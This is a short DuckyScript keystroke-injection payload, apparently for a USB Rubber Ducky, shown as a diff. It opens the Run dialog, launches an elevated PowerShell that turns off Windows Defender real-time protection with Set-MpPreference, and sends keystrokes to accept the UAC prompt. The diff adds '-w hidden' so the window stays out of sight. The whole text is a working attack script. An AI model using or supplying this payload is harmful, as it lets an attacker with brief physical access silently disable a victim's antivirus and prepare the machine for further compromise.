REM Turn off Windows Defender
REM
DELAY 1000
GUI r
DELAY 200
REM Start an elevated powershell instance which will disable Windows Defender.
- STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true'  -V runAs
+ STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true'  -V runAs
ENTER
DELAY 1000
REM if you need administrator [left, enter and delay 1000]
LEFT
ENTER
DELAY 1000
ALT y
